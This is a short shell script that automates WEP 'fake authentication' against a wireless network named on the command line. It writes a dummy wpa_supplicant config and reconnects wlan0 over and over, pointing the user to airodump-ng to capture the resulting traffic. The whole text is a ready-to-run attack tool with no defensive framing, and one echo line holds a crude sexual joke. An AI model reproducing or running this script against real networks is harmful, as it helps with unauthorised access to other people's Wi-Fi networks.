#!/bin/sh
killall wpa_supplicant
clear
echo ""
SEL=$1
if [ "$SEL" != "" ]
then
    echo ""
    if [ -e fake.conf ]; then
        echo "Deleting old fake.conf"
        rm fake.conf
    fi
    echo 'network={ \n ssid="'$SEL'" \n key_mgmt=NONE \n wep_key0="fakeauth" \n }' > fake.conf
    echo "Starting Fake Authentication with $SEL"
    
else
    if ! [ -e fake.conf ]; then
        echo "ERROR - No config found, Provide ESSID"
        exit 1
    fi
    echo ""
    echo "Starting Fake Authentication with Previous ESSID"
fi


echo ""
echo "How many times do you want to fake it? (30):"
read TIMES
if [ "$TIMES" = "" ]; then TIMES=30; fi


echo ""
echo "How many seconds between restarts? (45):"
read SEC
if [ "$SEC" = "" ]; then SEC=45; fi

i=1
while [ $i -le $TIMES ]
do
wpa_supplicant -c fake.conf -i wlan0 -Dwext -B
echo ""
echo "Fake Auth Connection ($i of $TIMES) Success ...maybe check airodump-ng to be sure."
i=`expr $i + 1`
if [ $i -le $TIMES ]; then
    echo "Reconnecting in $SEC seconds"
    sleep $SEC
    echo "Faking orgasam again... uh! ah! That's the spot!"
fi
done
